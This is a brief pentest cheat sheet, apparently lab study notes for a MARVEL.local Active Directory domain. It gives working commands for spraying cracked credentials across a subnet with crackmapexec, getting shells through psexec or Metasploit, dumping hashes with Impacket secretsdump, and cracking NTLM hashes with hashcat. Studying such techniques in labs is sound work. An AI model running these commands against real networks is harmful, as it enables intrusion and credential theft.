
Once we have a cracked password or hash, Use it to run in the whole network and sweep in all the systems uses this cracked credentials.

## Crackmapexec

```sh
# Install crackmapexec
> sudo apt install crackmapexec

# Run crackmapexec 
> crackmapexec smb <targetnetworkcidr:192.168.1.0/24> -u <username: fcastle> -d <domainname: MARVEL.local> -p <Password: Password1>
```

Use psexec script or psexec module in metasploit to pop a shell in to the new system after the crackmapexec script execution.

# Dumping Hashes

Once we have cracked credentials, we use the cracked credentials and try to dump other user hashes in all the machines which uses cracked creds.
## Secretsdump
```sh
# secrets dump is a part of Impacket Toolkit
> secretsdump.py <domain/crackedusername:password@newmachineIP: marvel/fcastle:Password1@192.168.2.1>
```

# Cracking Password Hashes

NOTE: NTLM password Hashes can be passed over network, but not NTLMv2.

## HASHCAT
```sh 
> hashcat -m 1000 <hashfile: hashes4.txt> <passwordfile: rockyou.txt> -O
```

